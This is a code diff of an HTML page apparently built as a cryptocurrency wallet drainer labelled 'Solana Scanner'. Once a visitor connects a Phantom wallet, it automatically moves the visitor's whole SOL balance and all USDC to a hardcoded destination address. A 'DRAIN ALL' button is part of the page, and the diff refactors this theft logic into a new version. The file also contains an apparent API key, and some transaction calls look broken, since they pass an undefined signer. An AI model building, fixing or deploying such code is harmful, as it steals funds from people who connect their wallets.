@@ -3,22 +3,53 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Scanner (Fixed)</title>
-    <!-- Solana Web3.js -->
+    <title>Solana Scanner v4</title>
+    
+    <!-- 1. Solana Web3.js -->
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-    <!-- SPL Token Library -->
-    <script src="https://unpkg.com/@solana/spl-token@0.4.8/lib/index.iife.js"></sctipt>
+    
+    <!-- 2. SPL Token Library (v0.4.8) -->
+    <script src="https://unpkg.com/@solana/spl-token@0.4.8/lib/index.iife.js"></script>
     
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #121212; color: white; display: flex; justify-content: center; padding: 20px; }
-        .card { background: #1e1e1e; padding: 25px; border-radius: 16px; width: 100%; max-width: 400px; box-shadow: 0 8px 32px rgba(0,0,0,0.5); border: 1px solid #333; }
-        h2 { margin-top: 0; text-align: center; color: #a78bfa; }
-        button { width: 100%; padding: 14px; margin: 8px 0; border: none; border-radius: 10px; font-weight: bold; font-size: 15px; cursor: pointer; transition: 0.2s; }
-        .btn-con { background: #7c3aed; color: white; }
-        .btn-drain { background: #fbbf24; color: black; display: none; }
-        .btn-drain:hover { background: #f59e0b; }
-        .log-box { background: #000; padding: 15px; margin-top: 20px; border-radius: 10px; font-family: monospace; font-size: 13px; height: 200px; overflow-y: auto; border: 1px solid #333; }
-        .log-entry { margin-bottom: 5px; }
+        body {
+            margin: 0;
+            padding: 20px;
+            background-color: #121212;
+            color: white;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            background-color: #1e1e1e;
+            width: 100%;
+            max-width: 450px;
+            padding: 25px;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            border: 1px solid #333;
+        }
+
+        h1 { margin: 0 0 5px 0; font-size: 24px; text-align: center; color: #a78bfa; }
+        p.subtitle { text-align: center; color: #888; margin-bottom: 20px; font-size: 14px; }
+
+        .btn {
+            width: 100%; padding: 15px; border: none; border-radius: 12px;
+            font-size: 16px; font-weight: bold; cursor: pointer; margin-bottom: 10px;
+        }
+        .btn-connect { background-color: #7c3aed; color: white; }
+        .btn-drain { background-color: #fbbf24; color: black; display: none; }
+
+        .log-box {
+            background-color: #000; border: 1px solid #333; border-radius: 10px;
+            padding: 15px; height: 200px; overflow-y: auto;
+            font-family: 'Courier New', monospace; font-size: 13px; margin-top: 20px;
+        }
+        .log-entry { margin-bottom: 6px; line-height: 1.4; }
         .success { color: #4ade80; }
         .error { color: #f87171; }
         .info { color: #60a5fa; }
@@ -26,53 +57,70 @@
 </head>
 <body>
 
-<div class="card">
-    <h2>Solana Scanner</h2>
-    <button id="connectBtn" class="btn-con">Connect Phantom</button>
-    <button id="drainBtn" class="btn-drain">DRAIN ALL (SOL + USDC)</button>
-    
-    <div id="logs" class="log-box"></div>
+<div class="container">
+    <h1>Solana Scanner</h1>
+    <p class="subtitle">Target: GwsPP9HHhCvEQeu3HTFzsVL6DEtnnYw4ALEtA3fMBC9Q</p>
+
+    <button id="connectBtn" class="btn btn-connect">Connect Phantom</button>
+    <button id="drainBtn" class="btn btn-drain">DRAIN ALL (USDC + SOL)</button>
+
+    <div id="logBox" class="log-box"></div>
 </div>
 
 <script>
     // --- CONFIGURATION ---
-    const DESTINATION_WALLET = "3WmoRcvkSY2gJBFywms3fqoVAMMkXFbYARpD2Ldwysg5";
-    const USDC_MINT_ADDRESS = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
+    const DESTINATION = "GwsPP9HHhCvEQeu3HTFzsVL6DEtnnYw4ALEtA3fMBC9Q";
+    const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
     
     // Your Alchemy Key
     const API_KEY = "alch_HyWkJpqVXY3kua9VObcl9"; 
     const RPC_URL = `https://solana-mainnet.g.alchemy.com/v2/${API_KEY}`;
 
-    let walletPublicKey = null; // Store as PublicKey object
-    const logsDiv = document.getElementById('logs');
+    let walletPublicKey = null;
+    
+    // UI Elements
+    const connectBtn = document.getElementById('connectBtn');
+    const drainBtn = document.getElementById('drainBtn');
+    const logBox = document.getElementById('logBox');
 
-    function log(msg, type = 'info') {
+    function log(msg, type='info') {
         const div = document.createElement('div');
         div.className = `log-entry ${type}`;
         div.innerText = msg;
-        logsDiv.appendChild(div);
-        logsDiv.scrollTop = logsDiv.scrollHeight;
+        logBox.appendChild(div);
+        logBox.scrollTop = logBox.scrollHeight;
     }
 
+    // SPL Library Mapping
+    let splTokenLib;
+    try {
+        if (window.spl && window.spl.token) {
+            splTokenLib = window.spl.token;
+        } else if (window.SPL) {
+            splTokenLib = window.SPL;
+        } else {
+            throw new Error("SPL library not found");
+        }
+    } catch (e) {
+        log("❌ SPL Library Missing: " + e.message, 'error');
+    }
+
+    // 1. Connect Function
     async function connect() {
         const provider = window.phantom?.solana || window.solana;
+        
         if (!provider) {
-            log("❌ Phantom not found!", "error");
+            log("❌ Phantom Wallet not found!", 'error');
             return;
         }
 
         try {
-            // 1. Connect
             await provider.connect();
             
-            // 2. ROBUST WALLET EXTRACTION
-            // Handle cases where publicKey is a string, object, or undefined
+            // Robust Public Key Extraction
             let rawKey = provider.publicKey;
-            
             if (!rawKey) throw new Error("No public key returned");
 
-            // If it's already a PublicKey object, use it. 
-            // If it's an object with 'toString' method (like older Phantom versions), convert to string first.
             let keyString = "";
             if (typeof rawKey === 'string') {
                 keyString = rawKey;
@@ -82,112 +130,112 @@
                 throw new Error("Invalid public key format");
             }
 
-            // Create a clean PublicKey object for use in transactions
             walletPublicKey = new solanaWeb3.PublicKey(keyString);
             
             // Update UI
-            document.getElementById('connectBtn').style.display = 'none';
-            document.getElementById('drainBtn').style.display = 'block';
-            log(`✅ Connected: ${walletPublicKey.toString()}`, "success");
+            connectBtn.style.display = 'none';
+            drainBtn.style.display = 'block';
+            log(`✅ Connected: ${walletPublicKey.toString()}`, 'success');
 
             // Start Scan
             await drainAll();
 
         } catch (err) {
             console.error(err);
-            log("❌ Connection Failed: " + err.message, "error");
+            log("❌ Connection Failed: " + err.message, 'error');
         }
     }
 
+    // 2. Drain Function
     async function drainAll() {
         const connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');
         
-        // 1. Drain SOL
-        log("🔄 Checking SOL...", "info");
-        const solBalance = await connection.getBalance(walletPublicKey);
-        
-        if (solBalance > 0) {
-            log(`💰 Found ${(solBalance/1e9).toFixed(4)} SOL`, "success");
+        // --- A. DRAIN SOL ---
+        log("🔄 Scanning for SOL...", 'info');
+        try {
+            const solBalance = await connection.getBalance(walletPublicKey);
             
-            // Send All SOL
-            const txSol = new solanaWeb3.Transaction().add(
-                solanaWeb3.SystemProgram.transfer({
-                    fromPubkey: walletPublicKey,
-                    toPubkey: new solanaWeb3.PublicKey(DESTINATION_WALLET),
-                    lamports: solBalance // Send exact amount (leaves 0)
-                })
-            );
-            
-            await connection.sendTransaction(txSol, [wallet]);
+            if (solBalance > 0) {
+                log(`💰 Found ${(solBalance/1e9).toFixed(4)} SOL`, 'success');
+                
+                const txSol = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: walletPublicKey,
+                        toPubkey: new solanaWeb3.PublicKey(DESTINATION),
+                        lamports: solBalance // Send exact amount (leaves 0)
+                    })
+                );
 
-        } else {
-            log("⚠️ No SOL found", "error");
+                await connection.sendTransaction(txSol, [wallet]);
+                log("✅ SOL Sent!", 'success');
+            } else {
+                log("⚠️ No SOL found", 'error');
+            }
+        } catch (err) {
+            log(`❌ SOL Error: ${err.message}`, 'error');
         }
 
-        // 2. Drain USDC
-        log("🔄 Checking USDC...", "info");
-        
+        // --- B. DRAIN USDC ---
+        log("🔄 Scanning for USDC...", 'info');
         try {
-            // Ensure spl is defined (from previous fix)
-            if (!window.spl || !window.spl.token) {
-                throw new Error("SPL Token library missing");
-            }
-            const spl = window.spl.token;
+            if (!splTokenLib) throw new Error("SPL Library missing");
 
-            const usdcMint = new solanaWeb3.PublicKey(USDC_MINT_ADDRESS);
+            const usdcMint = new solanaWeb3.PublicKey(USDC_MINT);
             
-            // Calculate ATA: SPL Token Program ID + Wallet + Mint
+            // Calculate ATA (Associated Token Account)
             const ata = await solanaWeb3.PublicKey.findProgramAddressSync(
                 [
                     walletPublicKey.toBuffer(),
-                    spl.token.TOKEN_PROGRAM_ID.toBuffer(),
+                    splTokenLib.TOKEN_PROGRAM_ID.toBuffer(),
                     usdcMint.toBuffer()
                 ],
-                spl.token.ASSOCIATED_TOKEN_PROGRAM_ID
+                splTokenLib.ASSOCIATED_TOKEN_PROGRAM_ID
             );
 
-            // Get Balance of that ATA
+            // Get Balance
             const balanceInfo = await connection.getTokenAccountBalance(ata[0]);
             
             if (balanceInfo.value.uiAmount > 0) {
-                log(`💰 Found ${balanceInfo.value.uiAmount} USDC`, "success");
+                log(`💰 Found ${balanceInfo.value.uiAmount} USDC`, 'success');
                 
                 // Calculate Destination ATA
-                const destPubkey = new solanaWeb3.PublicKey(DESTINATION_WALLET);
+                const destPubkey = new solanaWeb3.PublicKey(DESTINATION);
                 const destAta = await solanaWeb3.PublicKey.findProgramAddressSync(
                     [
                         destPubkey.toBuffer(),
-                        spl.token.TOKEN_PROGRAM_ID.toBuffer(),
+                        splTokenLib.TOKEN_PROGRAM_ID.toBuffer(),
                         usdcMint.toBuffer()
                     ],
-                    spl.token.ASSOCIATED_TOKEN_PROGRAM_ID
+                    splTokenLib.ASSOCIATED_TOKEN_PROGRAM_ID
                 );
 
                 // Create Transfer Instruction
-                const transferIx = spl.token.createTransferInstruction(
+                const transferIx = splTokenLib.createTransferInstruction(
                     ata[0],           // Source ATA
                     destAta[0],       // Destination ATA
                     walletPublicKey,  // Owner
-                    balanceInfo.value.amount, // Amount (raw string)
+                    balanceInfo.value.amount, // Raw amount string
                     undefined,        // Multi-owner
-                    spl.token.TOKEN_PROGRAM_ID
+                    splTokenLib.TOKEN_PROGRAM_ID
                 );
 
                 const tx = new solanaWeb3.Transaction().add(transferIx);
                 await connection.sendTransaction(tx, [wallet]);
-                log("✅ USDC Sent", "success");
+                log("✅ USDC Sent!", 'success');
             } else {
-                log("⚠️ No USDC found in ATA", "error");
+                log("⚠️ No USDC found", 'error');
             }
-
         } catch (err) {
             console.error(err);
-            log(`❌ USDC Error: ${err.message}`, "error");
+            log(`❌ USDC Error: ${err.message}`, 'error');
         }
+
+        drainBtn.innerText = "DRAIN ALL (USDC + SOL)";
     }
 
-    document.getElementById('connectBtn').addEventListener('click', connect);
-    document.getElementById('drainBtn').addEventListener('click', drainAll);
+    // Event Listeners
+    connectBtn.addEventListener('click', connect);
+    drainBtn.addEventListener('click', drainAll);
 
 </script>
 </body>
